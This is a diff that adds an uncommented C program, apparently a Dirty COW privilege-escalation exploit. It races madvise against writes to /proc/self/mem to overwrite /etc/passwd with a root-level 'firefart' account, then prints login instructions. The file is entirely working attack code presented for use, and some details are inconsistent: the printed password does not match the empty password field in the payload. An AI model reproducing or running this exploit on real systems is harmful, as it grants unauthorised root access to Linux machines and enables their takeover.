@@ -1,0 +1,59 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/stat.h>
+
+char *filename = "/etc/passwd";
+char *backup_filename = "/tmp/passwd.bak";
+
+char *payload =
+"firefart::0:0:root:/root:/bin/bash\n";
+
+void *map;
+struct stat st;
+
+void *madviseThread(void *arg) {
+    int i;
+    for (i = 0; i < 1000000; i++) {
+        madvise(map, 100, MADV_DONTNEED);
+    }
+    return NULL;
+}
+
+void *writeThread(void *arg) {
+    int f = open("/proc/self/mem", O_RDWR);
+    lseek(f, (off_t) map, SEEK_SET);
+    write(f, payload, strlen(payload));
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    printf("Backing up /etc/passwd to /tmp/passwd.bak\n");
+    int source = open(filename, O_RDONLY);
+    int dest = open(backup_filename, O_WRONLY | O_CREAT, 0600);
+    char buffer[4096];
+    ssize_t bytes;
+    while ((bytes = read(source, buffer, sizeof(buffer))) > 0) {
+        write(dest, buffer, bytes);
+    }
+    close(source);
+    close(dest);
+
+    int f = open(filename, O_RDONLY);
+    fstat(f, &st);
+    map = mmap(NULL, st.st_size + sizeof(payload), PROT_READ, MAP_PRIVATE, f, 0);
+
+    pthread_t pth1, pth2;
+    pthread_create(&pth1, NULL, madviseThread, NULL);
+    pthread_create(&pth2, NULL, writeThread, NULL);
+
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+
+    printf("Done! Try: su firefart\nPassword: dirtycow\n");
+    return 0;
+}
